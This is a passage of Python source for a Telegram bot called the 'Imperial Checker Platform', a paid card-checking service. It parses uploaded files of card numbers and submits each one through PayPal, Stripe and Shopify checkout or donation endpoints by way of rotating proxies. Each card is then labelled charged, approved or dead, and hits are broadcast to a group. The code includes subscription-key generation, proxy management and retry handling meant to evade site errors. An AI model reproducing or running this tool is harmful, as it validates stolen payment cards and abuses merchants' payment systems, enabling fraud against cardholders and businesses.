                    return {'status': 'Dead', 'message': f'PayPal: {issue}', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}
                
            async with local_session.post(f"https://paypal-gateway-target.example.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}", data=payload2, headers={'User-Agent': ua}, proxy=proxy_str, timeout=20) as r4:
                try: j4 = await r4.json()
                except Exception: return {'status': 'Dead', 'message': 'Transaction Denied Completely', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}

            if j4.get("success") is True:
                return {'status': 'Charged', 'message': 'Charged via PayPal Capture', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}
            
            j4_str = str(j4).lower()
            if 'insufficient' in j4_str or 'funding_source_declined' in j4_str:
                return {'status': 'Insufficient', 'message': 'PayPal: Insufficient Balance Flag', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}
            if 'security_code' in j4_str or 'cvv' in j4_str or 'zip' in j4_str:
                return {'status': 'Approved', 'message': 'PayPal Approved: CVC/AVS Validation Mismatch', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}
                
            return {'status': 'Dead', 'message': 'PayPal: Card Void / Hard Decline', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}

    except Exception as e:
        return {'status': 'Site Error', 'message': f'Tunnel Blocked: {str(e)[:30]}', 'card': card, 'retry': True, 'gateway': 'PayPal Secure', 'price': '1.00$'}

# ====================== SHOPIFY CENTRAL ENGINE API ======================
async def check_card_api(card, site, proxy, session, gateway_name):
    try:
        if len(card.split('|')) != 4: return {'status': 'Dead', 'message': 'Invalid card format', 'card': card}
        
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        proxy_param = f"&proxy={proxy_str}" if proxy else ""
        req_url = f"{CHECKER_API_URL}?cc={card}&site={site}{proxy_param}"
        
        async with session.get(req_url, timeout=90) as resp:
            text_data = await resp.text()
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
            try: rj = json.loads(text_data)
            except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
            
        rm = str(rj.get('Response', '')).strip()
        pr = rj.get('Price', '-')
        gt = rj.get('Gateway', gateway_name)
        st = str(rj.get('Status', '')).strip().lower()
        
        if is_dead_site_error(rm): return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        rl = rm.lower()
        
        if st == 'true' or 'success' in rl or 'charged' in rl or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl: 
            return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if 'cloudflare bypass failed' in rl: 
            return {'status': 'Site Error', 'message': 'Cloudflare active', 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        if 'insufficient_funds' in rl or 'insufficient funds' in rl: 
            return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']): 
            return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed']): 
            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
            
        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
    except asyncio.TimeoutError: 
        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception as e: 
        return {'status': 'Site Error', 'message': f'Connection dropped: {str(e)[:20]}', 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
    lr = None; ap = list(proxies) if proxies else []
    for _ in range(max_retries):
        p = random.choice(ap) if ap else None
        
        if gateway_name == "Stripe": return await check_stripe_donate_api(card, p)
        elif gateway_name == "PayPal": return await check_paypal_donate_api(card, p)
        else:
            acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
            if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
            s = random.choice(acs)
            r = await check_card_api(card, s, p, session, gateway_name)
            
        if not r.get('retry'):
            if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: _SITE_ERRORS_COUNT[s] = 0
            return r
        lr = r; await asyncio.sleep(DELAY)
        
    if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}

# ====================== TIER KINGLY DISPLAY MATRIX ======================
def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    
    if status == "Charged": h = f"<b>{CE_STAR} MASTER CHARGED TRANSACTION SUCCESSFUL {CE_STAR}</b>"
    elif status == "Approved": h = f"<b>{CE_ROCKET} LIVE APPROVED CVV / HIGH SPEC {CE_ROCKET}</b>"
    elif status == "Insufficient": h = f"<b>{CE_FIRE} LIVE INSUFFICIENT VEHICLE FUNDS {CE_FIRE}</b>"
    else: h = f"<b>❌ TRANSACTION REJECTED (DECLINED) ❌</b>"
    
    country_code = str(bi.get('country_code', '')).strip()
    flag = get_flag_emoji(country_code) if country_code else "🏳️"
    cd = f"{bi.get('country', '-')} {flag}"
    
    return f"""{h}

<b>⚜️ Target Card:</b> <code>{card}</code>
<b>⚡ Core Engine Response:</b> <code>{response}</code>

<b>✨ Pipeline Gateway:</b> <code>{gateway}</code>
<b>💎 Cleared Volume:</b> <code>{ps}</code>

<b>📊 BANK STRUCTURAL INFORMATION:</b>
 ├ <b>Financial Institution:</b> <code>{bi.get('bank', '-')}</code>
 ├ <b>Geographic Jurisdiction:</b> <code>{cd}</code>
 ├ <b>Card Network Brand:</b> <code>{bi.get('brand', '-')}</code>
 ╰ <b>Class Specification:</b> <code>{bi.get('type', '-')} — {bi.get('level', '-')}</code>

<b>⏳ Operational Pipeline Latency:</b> <code>{elapsed:.2f}s</code>"""

async def _send_global_hit(status, gateway, message, price, uid, bot, elapsed):
    if not HITS_GROUP_TARGET: return
    try:
        user_name = _USER_NAMES.get(uid, f"User {uid}")
        safe_name = escape_html(user_name)
        plan = await get_user_plan(uid)
        plan_name = plan.title() if plan else "Free"
        ps = f" {f'${str(price).replace('$', '')}'}" if price and str(price) != "-" else ""
        
        if status == "Charged": h = f"<b>{CE_STAR} GLOBAL LIVE CHARGE ANNOUNCEMENT {CE_STAR}</b>"
        elif status == "Insufficient": h = f"<b>{CE_FIRE} GLOBAL LIVE INSUFFICIENT FUNDS ANNOUNCEMENT {CE_FIRE}</b>"
        else: return 
        
        text = f"""{h}

<b>🔱 Core Gateway:</b> <code>{gateway}</code>{ps}
<b>⚡ Status Return:</b> <code>{message}</code>
<b>⏳ Pipeline Latency:</b> <code>{elapsed:.2f}s</code>
<b>👤 Initiated By:</b> <a href="tg://user?id={uid}">{safe_name}</a> (<code>{plan_name}</code>)"""

        try: cid = int(HITS_GROUP_TARGET)
        except ValueError: cid = HITS_GROUP_TARGET
        await bot.send_message(chat_id=cid, text=text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: pass

# ====================== CENTRALIZED ROUTER ======================
async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    pm = await styled_reply(update, f"<b>{CE_TIME} Allocating memory for incoming file payload...</b>", use_gif=True)
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
            return await styled_edit(pm, f"<b>{CE_FIRE} Operational Conflict. An engine task is already executing in background.</b>")
        doc = update.message.document
        if doc.file_size > 3 * 1024 * 1024: return await styled_edit(pm, f"<b>❌ Payload Rejected. Max limits cannot exceed 3MB.</b>")
        if not await force_join_check(update, context): 
            try: await pm.delete()
            except Exception: pass
            return
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0: return await styled_edit(pm, f"<b>❌ Deployment Halted. Your proxy configuration block is empty. Use /addpxy.</b>")
        
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        except Exception:
            async with aiofiles.open(fp, "r", encoding="latin-1", errors="ignore") as file: content = await file.read()
            
        if os.path.exists(fp): os.remove(fp)
        
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"<b>❌ Parsing Error. No standard card structures identified inside file.</b>")
        
        cl = get_cc_limit(await get_user_plan(uid), uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        kb = [
            [InlineKeyboardButton("👑 Shopify Engine 👑", callback_data="gate:Shopify"), InlineKeyboardButton("⚡ Stripe Ultra (1$) ⚡", callback_data="gate:Stripe")],
            [InlineKeyboardButton("💎 PayPal Matrix (1$) 💎", callback_data="gate:PayPal"), InlineKeyboardButton("🔒 Braintree Secure (Soon)", callback_data="gate:soon_Braintree")],
            [InlineKeyboardButton("🛑 Terminate Blueprint 🛑", callback_data="gate:cancel")]
        ]
        await styled_edit(pm, f"<b>{CE_STAR} FILE INTEGRATION COMPLETED SUCCESSFULLY</b>\n\n├ <b>Total Extracted Records:</b> <code>{len(cards)} Cards</code>\n╰ <b>Deploy Protocol:</b> Choose an operational gateway backend:", buttons=kb)
    except Exception as e: await styled_edit(pm, f"<b>❌ System Fatal Fault:</b> {str(e)}")

async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if not update.message: return
    uid = update.effective_user.id
    
    USER_LAST_REQ[uid] = time.time()
    _USER_NAMES[uid] = update.effective_user.first_name or str(uid)
    raw_text = update.message.text or update.message.caption or ""
    
    if not re.match(r'^[/.][a-zA-Z0-9]', raw_text):
        if update.message.document:
            mime = update.message.document.mime_type or ""
            fname = update.message.document.file_name or ""
            if mime.startswith('text/') or mime == 'application/octet-stream' or fname.endswith('.txt'):
                await auto_file_check_cmd(update, context)
        return

    tokens = raw_text.split()
    cmd = tokens[0][1:].lower().split('@')[0] 
    args = tokens[1:]

    if cmd in ["start", "cmds", "commands"]:
        if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_GEAR} SYSTEM LOCKDOWN ACTIVE</b>\n\nThe server is optimizing internal nodes right now. Please stand by.", use_gif=True)
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(update, uid, plan, limit)

    elif cmd == "info":
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        t = f"""<b>{CE_STAR} IDENTITY ARCHITECTURE INTEGRITY INTEL</b>

├ <b>Cryptographic ID:</b> <code>{uid}</code>
├ <b>Security Clearance:</b> <code>{'Active Premium' if is_paid_plan(plan) else 'Standard Tier'}</code>
├ <b>Subscription Identity:</b> <code>{plan.title() if plan else 'Bronze'}</code>
╰ <b>Engine Mass Capacity:</b> <code>{limit} Cards Per File</code>"""
        await styled_reply(update, t, use_gif=True)

    elif cmd == "plan":
        if not await force_join_check(update, context): return
        cp = await get_user_plan(uid)
        t = "<b>╔══════════════════════════════╗\n     ⚜️ PREMIUM NETWORK ACCESS TIERS ⚜️\n╚══════════════════════════════╝</b>\n\n"
        for _, pi in PLANS.items():
            t += f"👑 <b>{pi['name']}</b>\n ├ <b>Validity:</b> <code>{pi['duration_days']} Days Allocation</code>\n ├ <b>Worker Concurrency:</b> <code>{get_cc_limit(pi['tier'])} Capacity</code>\n ╰ <b>Investment:</b> <code>{pi['price']}</code>\n\n"
        t += f"<b>Current Signature Status:</b> <code>{cp.title() if cp else 'Bronze'}</code>"
        kb = [[InlineKeyboardButton("🔱 Initiate Purchase Transaction 🔱", url="https://t.me/Dddadddyttt")], [InlineKeyboardButton("↩️ Back to Home Terminal", callback_data="back_start")]]
        await styled_reply(update, t, buttons=kb, use_gif=True)

    elif cmd == "fb":
        if not await force_join_check(update, context): return
        txt = raw_text.split(maxsplit=1)[1] if len(tokens) > 1 else ""
        if not txt and not update.message.reply_to_message and not getattr(update.message, 'media', None): 
            return await styled_reply(update, f"<b>❌ Operational Fault. Transmission text cannot be empty.</b>", use_gif=True)
        if ADMIN_ID:
            try:
                if update.message.reply_to_message:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.reply_to_message.message_id)
                else:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.message_id)
            except Exception: pass
        await styled_reply(update, f"<b>{CE_STAR} Secure transmission has been successfully routed to high command.</b>", use_gif=True)

    elif cmd == "addpxy":
        if not await force_join_check(update, context): return
        lines = []
        if update.message.reply_to_message:
            if update.message.reply_to_message.document:
                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                fp = f"px_{uid}.txt"
                await f.download_to_drive(fp)
                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: lines = (await file.read()).split()
                os.remove(fp)
            else:
                raw_rep = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
                lines = raw_rep.split()
        else:
            if len(tokens) > 1: lines = args
            else: return await styled_reply(update, f"<b>❌ Protocol Error. Please feed raw proxy strings or reply to a text proxy file.</b>", use_gif=True)
        
        if not lines: return await styled_reply(update, f"<b>❌ Injection Cancelled. Empty string detected.</b>", use_gif=True)
        db_p = await get_all_user_proxies(uid)
        eu = {p['proxy_url'] for p in db_p} if db_p else set()
        if len(eu) >= 150: return await styled_reply(update, f"<b>❌ Overflow Alert. Maximum proxy storage is capped at 150.</b>", use_gif=True)
        parsed = []
        for l in lines:
            px = parse_proxy_format(l)
            if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
        if not parsed: return await styled_reply(update, f"<b>❌ Process Complete. Zero unique/valid proxies were injected.</b>", use_gif=True)
        parsed = parsed[:150-len(eu)]
        tm = await styled_reply(update, f"<b>{CE_GEAR} Writing configurations to database array...</b>", use_gif=True)
        c = 0
        for p2 in parsed: await add_proxy_db(uid, p2); c += 1
        await styled_edit(tm, f"<b>{CE_STAR} INJECTION COMPLETED:</b> <code>{c} Proxies Saved Safely.</code>")

    elif cmd == "proxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<b>❌ Memory Void. No proxy nodes registered for your user signature.</b>", use_gif=True)
        t = f"<b>{CE_GEAR} ACTIVE ROUTING PROXIES ({len(proxies)}/150 Max)</b>\n\n"
        for i, p in enumerate(proxies[:30], 1): t += f"<code>{i:02d}.</code> <code>{p['ip']}:{p['port']}</code>\n"
        if len(proxies) > 30: t += f"\n<i>...and {len(proxies)-30} additional nodes cached.</i>"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "rmpxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<b>❌ Purge Aborted. Cache is already pristine.</b>", use_gif=True)
        if not args: return await styled_reply(update, f"<b>❌ Missing Flag. Specify explicit index number or write 'all'.</b>", use_gif=True)
        arg = args[0].strip().lower()
        if arg == 'all':
            c = await clear_all_proxies(uid)
            return await styled_reply(update, f"<b>{CE_STAR} SYSTEM PURGE SUCCESS: <code>{c}</code> nodes deleted.</b>", use_gif=True)
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(proxies): 
                await remove_proxy_by_index(uid, idx)
                await styled_reply(update, f"<b>{CE_STAR} Cache block removed successfully.</b>", use_gif=True)
            else: await styled_reply(update, f"<b>❌ Index Out Of Bounds.</b>", use_gif=True)
        except Exception: await styled_reply(update, f"<b>❌ Index Unrecognizable.</b>", use_gif=True)

    elif cmd == "gen":
        if uid not in ADMIN_ID: return
        if len(args) < 1: return await styled_reply(update, f"<b>❌ Syntax Failure:</b> <code>/gen [plan1 to plan4] [quantity]</code>", use_gif=True)
        pk = args[0].lower()
        amt = int(args[1]) if len(args) > 1 else 1
        if pk not in PLANS: return await styled_reply(update, f"<b>❌ Blueprint Class Mismatch. Choose plan1, plan2, plan3, plan4</b>", use_gif=True)
        pi = PLANS[pk]
        kdb = await load_keys()
        gc = []
        for _ in range(amt):
            c = f"IMPERIAL-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))}"
            kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            gc.append(c)
        await save_keys(kdb)
        t = f"<b>{CE_STAR} MASTER KEYS GENERATED SUCCESSFULLY [x{amt}]</b>\n\n├ <b>Class:</b> <code>{pi['name']}</code>\n├ <b>Validity Vector:</b> <code>{pi['duration_days']} Days</code>\n╰ <b>Worker Core Limit:</b> <code>{get_cc_limit(pi['tier'])} CCs</code>\n\n"
        for c in gc: t += f"<code>{c}</code>\n"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "redeem":
        if not await force_join_check(update, context): return
        c = args[0].strip() if args else ""
        if not c: return await styled_reply(update, f"<b>❌ Missing Signature:</b> <code>/redeem [Key]</code>", use_gif=True)
        kdb = await load_keys()
        if c not in kdb: return await styled_reply(update, f"<b>❌ Encryption Error. Key is false or does not exist in master ledger.</b>", use_gif=True)
        ki = kdb[c]
        if ki["used"]: return await styled_reply(update, f"<b>❌ Compromised Key. This token has already been burned.</b>", use_gif=True)
        t, d = ki["tier"], ki["days"]
        await set_user_plan(uid, t, d)
        kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        kdb[c]["redeemed_at"] = rt
        await save_keys(kdb)
        ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')
        limit = get_cc_limit(t, uid)
        
        user_name = _USER_NAMES.get(uid, f"User {uid}")
        safe_name = escape_html(user_name)
        
        msg = f"""<b>{CE_STAR} CLEARANCE ELEVATED — ACCESS GRANTED 👑</b>

├ <b>Operator Profile:</b> <a href="tg://user?id={uid}">{safe_name}</a>
├ <b>Allocated Security Tier:</b> <code>{t.upper()} ACCESS</code>
├ <b>Pipeline Lifespan:</b> <code>{d} Days Operational</code>
├ <b>Concurrence Core Speed:</b> <code>{limit} CC Limit</code>
╰ <b>Licence Expiration Date:</b> <code>{ed}</code>"""
        await styled_reply(update, msg, use_gif=True, specific_gif=REDEEM_GIF)
        
        try:
            an = f"<b>🚨 LOGISTICS INTELLIGENCE REPORT 🚨</b>\n\nA token has been burned yesternight.\n├ <b>Token Vector:</b> <code>{c}</code>\n├ <b>Operator:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{uid}</code>)\n├ <b>Clearance Level:</b> <code>{t}</code>\n╰ <b>Timestamp:</b> <code>{rt}</code>"
            if ADMIN_ID:
                for admin in ADMIN_ID: await styled_send(context.bot, admin, an, use_gif=True, specific_gif=REDEEM_GIF)
        except Exception: pass

    elif cmd == "validate":
        if uid not in ADMIN_ID: return
        c = args[0].strip() if args else ""
        kdb = await load_keys()
        if not c: return await styled_reply(update, f"<b>❌ Missing Parameter:</b> <code>/validate [Key]</code>", use_gif=True)
        if c not in kdb: return await styled_reply(update, f"<b>❌ Key non-existent.</b>", use_gif=True)
        ki = kdb[c]
        u, ub = ki.get("used", False), ki.get("used_by", "None")
        st = "COMPROMISED / USED" if u else "FRESH / OPERATIONAL"
        m = f"<b>{CE_STAR} ADVANCED CRYPTOGRAPHIC METADATA INTEL</b>\n\n├ <b>String Token:</b> <code>{c}</code>\n├ <b>Ledger Status:</b> <code>{st}</code>\n├ <b>Tier Target:</b> <code>{ki.get('tier', 'Unknown')}</code>\n├ <b>Lifespan Config:</b> <code>{ki.get('days', 0)} Days</code>\n╰ <b>Creation Signature:</b> <code>{ki.get('generated_at', 'Unknown')}</code>"
        if u: 
            prof_name = escape_html(_USER_NAMES.get(ub, f"User {ub}"))
            m += f"\n\n├ <b>Burned By Identity:</b> <code>{ub}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>Burn Timestamp:</b> <code>{ki.get('redeemed_at', 'Void')}</code>"
        await styled_reply(update, m, use_gif=True)

    elif cmd == "maint":
        if uid not in ADMIN_ID: return
        a = args[0].strip().lower() if args else ""
        if a: _MAINTENANCE_MODE = (a == 'on')
        else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
        t = "GLOBAL LOCKDOWN CONFIRMED" if _MAINTENANCE_MODE else "NETWORKS OPEN"
        await styled_reply(update, f"<b>{CE_GEAR} CORE STATUS UPDATE: {t}</b>", use_gif=True)

    elif cmd in ["users", "user"]:
        if uid not in ADMIN_ID: return
        active_info = []
        for u, p in list(ACTIVE_MTXT_PROCESSES.items()):
            if not p.get("stopped"):
                un = escape_html(_USER_NAMES.get(u, f"User {u}"))
                active_info.append(f"  ├ <b>Operator:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{u}</code>)\n  │  ╰ Pipeline: <code>{p.get('gate', 'Unknown')}</code> | Load: <code>{p.get('total', '?')} CCs</code>")
                
        recent_users_info = []
        sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15] 
        for u, _ in sorted_users:
            un = escape_html(_USER_NAMES.get(u, f"User {u}"))
            recent_users_info.append(f"  │  ├ <b>User:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ Identifier: <code>{u}</code>")
            
        text = f"<b>{CE_GEAR} SYSTEM CORE INFRASTRUCTURE REALTIME REPORT</b>\n\n├ <b>Total Cached Core Sessions:</b> <code>{len(USER_LAST_REQ)}</code>\n"
        if recent_users_info: text += f"  ╰ Active Traffic (Last 15):\n" + "\n".join(recent_users_info) + "\n\n"
        else: text += f"  ╰ Active Traffic: <code> Pristine / Empty</code>\n\n"
            
        text += f"├ <b>Engaged Concurrency Checkers:</b> <code>{len(active_info)} Pipelines Running</code>\n"
        if active_info: text += f"╰ <b>Execution Arrays Details:</b>\n" + "\n".join(active_info)
        else: text += f"╰ <b>Execution Arrays Details:</b> <code>Zero Load / Idle</code>"
            
        await styled_reply(update, text, use_gif=True)

    elif cmd == "revoke":
        if uid not in ADMIN_ID: return
        if not args: return await styled_reply(update, f"<b>❌ Missing Target Profile ID.</b>", use_gif=True)
        try: tu = int(args[0].strip())
        except Exception: return await styled_reply(update, f"<b>❌ Invalid ID.</b>", use_gif=True)
        await set_user_plan(tu, "Free", 0)
        proc = ACTIVE_MTXT_PROCESSES.get(tu)
        if proc:
            proc["stopped"] = True
            for t in proc.get("tasks", []):
                if not t.done(): t.cancel()
        admin_msg = f"<b>{CE_FIRE} ACCESS REVOKED — OPERATOR DEMOTED</b>\n├ <b>Target Profile:</b> <code>{tu}</code>\n╰ <b>Status:</b> <code>Stripped to Free Access</code>"
        await styled_reply(update, admin_msg, use_gif=True)
        try: await styled_send(context.bot, tu, f"<b>{CE_FIRE} SYSTEM THREAT LEVEL ALERT</b>\n\nYour premium clearance credentials have been forcefully revoked by central management.", use_gif=True)
        except Exception: pass

# ====================== CALLBACK MANAGEMENT ======================
async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query; uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("System Firewall Active. Standby.", show_alert=True)
    cp = await get_user_plan(uid)
    t = "<b>╔══════════════════════════════╗\n     ⚜️ PREMIUM NETWORK ACCESS TIERS ⚜️\n╚══════════════════════════════╝</b>\n\n"
    for _, pi in PLANS.items():
        t += f"👑 <b>{pi['name']}</b>\n ├ <b>Validity:</b> <code>{pi['duration_days']} Days Allocation</code>\n ├ <b>Worker Concurrency:</b> <code>{get_cc_limit(pi['tier'])} Capacity</code>\n ╰ <b>Investment:</b> <code>{pi['price']}</code>\n\n"
    t += f"<b>Current Signature Status:</b> <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [[InlineKeyboardButton("🔱 Initiate Purchase Transaction 🔱", url="https://t.me/Dddadddyttt")], [InlineKeyboardButton("↩️ Back to Home Terminal", callback_data="back_start")]]
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query; uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("System Under Maintenance.", show_alert=True)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    
    admin_panel = f"\n\n<b>{CE_GEAR} Executive Admin Suite:</b>\n ├ /gen [plan] [qty] ➔ Create Royal Keys\n ├ /validate [key] ➔ Full Data Intel\n ├ /users ➔ Realtime Core Infrastructure Status\n ╰ /maint ➔ Force System Global Lockdown" if uid in ADMIN_ID else ""
    
    t = f"""<b>╔══════════════════════════════╗</b>
<b>         {CE_STAR} IMPERIAL CHECKER PLATFORM {CE_STAR}         </b>
<b>╚══════════════════════════════╝</b>

<b>{CE_ROCKET} AUTOMATED PIPELINES:</b>
 ╰ <i>Feed a standard combo flat file (.txt) to deploy auto-checking</i>

<b>{CE_GEAR} NETWORK ENGINE SECURITY:</b>
 ├ /addpxy ➔ Hot-Plug Dynamic Proxies
 ├ /proxy  ➔ Inspect Active Proxies
 ╰ /rmpxy  ➔ Purge Proxy Buffers

<b>{CE_STAR} CORE EXECUTIVE PREFERENCES:</b>
 ├ /info   ➔ Identity Architecture
 ├ /redeem ➔ Upgrade Clearance Levels
 ├ /fb     ➔ Secure Channel to Operations
 ╰ /plan   ➔ Royal Tier Subscriptions{admin_panel}

<b>┌─── 🌌 CURRENT ACCOUNT CLEARENCE ───┐</b>
 <b>Tier Status:</b> <code>{plan.title() if plan else 'Bronze Access'}</code>
 <b>Engine Allocation Limit:</b> <code>{limit} Cards Max</code>
<b>└────────────────────────────────────┘</b>"""
    
    kb = [[InlineKeyboardButton("⚜️ Review Subscriptions ⚜️", callback_data="show_plans")]]
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton("Official Channel", url=JOIN_CHANNEL_LINK), InlineKeyboardButton("HQ Group", url=JOIN_GROUP_LINK)])
    elif is_valid_url(JOIN_CHANNEL_LINK):
        kb.append([InlineKeyboardButton("Official Channel", url=JOIN_CHANNEL_LINK)])
    elif is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton("HQ Group", url=JOIN_GROUP_LINK)])
        
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = q.from_user.id
    if uid in ADMIN_ID: 
        await q.answer("✅ Master Override Triggered", show_alert=True)
        try: await q.message.delete()
        except: pass
        plan = await get_user_plan(uid); limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
        return
        
    if await is_user_joined(uid, context.bot):
        await mark_user_joined(uid)
        _JOIN_CACHE[uid] = time.time()
        await q.answer("✅ Identity Verified. Authorization Token Saved.", show_alert=True)
        try: await q.message.delete()
        except Exception: pass
        plan = await get_user_plan(uid); limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
    else:
        await q.answer("❌ Identity Mismatch. Network connection not detected inside groups.", show_alert=True)

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    q = update.callback_query; uid = q.from_user.id
    gn = q.data.split(":")[1]
    if gn.startswith("soon_"): return await q.answer("⏳ Gateway array under structural development.", show_alert=True)
    await q.answer()
    msg_obj = q.message
    if gn == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(msg_obj, "<b>❌ Processing Sequence Aborted by User Request. Memory Cleaned.</b>", buttons=None)
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await q.answer("❌ Runtime Session Buffer Cleared.", show_alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
    
    workers_display = "" if gn in ["Stripe", "PayPal"] else f"\n├ <b>Multithread Array:</b> <code>{WORKERS} Threads Loaded</code>"
    await styled_edit(msg_obj, f"<b>{CE_GEAR} INITIALIZING ENGINE VECTOR SUBSYSTEMS...</b>\n\n├ <b>Payload Weight:</b> <code>{len(cards)} Records Loaded</code>{workers_display}\n╰ <b>Active Routing Matrix:</b> <code>Direct API Gate ➔ {gn}</code>", buttons=None)
    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))

# ====================== CONCURRENCY MASS DISPATCH RUNNER ======================
async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    tot = len(cards); chk = chg = app = ins = dec = err = 0
    st = time.time()
    sites = await get_github_sites()
    proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
    http_session = await get_user_http_session(uid)
    
    last_resp = "Awaiting first execution pipeline vector feedback..."
    concurrency_limit = 2 if gate_name in ["Stripe", "PayPal"] else WORKERS
    sem = asyncio.Semaphore(concurrency_limit)
    
